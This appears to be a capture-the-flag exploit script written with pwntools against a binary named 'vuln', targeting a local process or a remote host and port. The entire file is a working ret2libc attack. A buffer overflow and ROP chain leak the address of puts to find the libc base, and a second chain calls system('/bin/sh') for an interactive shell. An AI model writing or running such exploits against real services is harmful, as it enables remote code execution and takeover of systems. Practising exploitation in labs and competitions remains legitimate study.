#!/bin/python3
from pwn import *
import os

##################
# PWNTOOLS SETUP #
##################
context.terminal = "kitty"
# context.terminal = 'wt.exe wsl -d Ubuntu'.split()

binary = context.binary = ELF("./vuln")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

ELF.set_interpreter(binary.path, ld.path)
ELF.patch_custom_libraries(binary.path, libc.path.removesuffix("/libc.so.6"), False)

host = args.HOST or "localhost"
port = int(args.PORT or 25565)

if args.LOCAL:
    if args.GDBSCRIPT:
        io: tube = gdb.debug(binary.path, gdbscript=args.GDBSCRIPT)
    else:
        io: tube = process(binary.path)
else:
    io: tube = remote(host, port)

###########
# EXPLOIT #
###########
def find(string):
    args = [arg.strip() for arg in string.split(";")]
    return p64(ROP(binary).find_gadget(args).address)

payload = flat([
    b"\x00",
    b"A" * 0x87,
    find("pop rdi; ret"),
    p64(binary.got["puts"]),
    binary.symbols["puts"],
    binary.symbols["main"],
])

io.recvuntil(b"sErVeR!\n")
io.sendline(payload)
io.recvline()

libc_base = int.from_bytes(io.recvuntil(b"\nWeLcOmE", drop=True), "little") - libc.symbols["puts"]
print(hex(libc_base))

payload = flat([
    b"A" * 0x88,
    find("pop rdi; ret"),
    p64(next(libc.search(b"/bin/sh\x00")) + libc_base),
    find("ret"),
    p64(libc.symbols["system"] + libc_base),
])
io.sendline(payload)
io.interactive()
